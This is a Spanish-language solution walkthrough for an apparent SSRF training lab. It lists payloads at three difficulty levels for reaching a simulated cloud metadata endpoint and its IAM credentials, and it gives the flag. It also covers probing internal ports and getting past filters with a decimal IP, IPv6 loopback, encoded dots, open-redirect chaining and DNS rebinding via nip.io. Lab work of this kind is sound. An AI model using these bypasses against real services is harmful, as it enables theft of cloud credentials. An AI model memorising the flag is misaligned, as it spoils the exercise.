Easy — Acceso directo a servicios internos

  1. Accede al endpoint de metadatos cloud simulado: 
    http://localhost:5000/internal/cloud-metadata
  2. Enumera credenciales IAM simuladas de AWS: 
    http://localhost:5000/internal/cloud-metadata/iam/security-credentials/hacklabs-ec2-role
  3. Obtén las credenciales AWS simuladas (flag incluida en el JSON): 
    curl "http://localhost:5000/ssrf?url=http://localhost:5000/internal/cloud-metadata/iam/security-credentials/hacklabs-ec2-role"
  4. Flag: HL{55rf_cl0ud_m3t4d4t4} (dentro de la respuesta JSON)
  5. Escanea puertos internos para detectar servicios: 
    http://localhost:22    # detecta SSH
http://localhost:3306  # detecta MySQL

Medium — Bypass de blacklist (localhost/127.0.0.1 bloqueados)

  1. Usa la IP decimal equivalente a 127.0.0.1 (2130706433): 
    http://2130706433:5000/internal/cloud-metadata
  2. Accede a los metadatos igual que en Easy usando esa IP alternativa.

Hard — Bypass de whitelist estricta

  1. IPv6 loopback (si no está bloqueado): 
    http://[::1]:5000/internal/cloud-metadata
  2. URL encoding doble para evadir la validación de cadena: 
    http://127%2e0%2e0%2e1:5000/internal/cloud-metadata
  3. Encadena con el lab de Open Redirect: usa un endpoint del servidor que redirija al destino interno.
  4. DNS rebinding: usa un servicio externo que resuelva a 127.0.0.1 (por ejemplo 7f000001.nip.io): 
    http://7f000001.nip.io:5000/internal/cloud-metadata
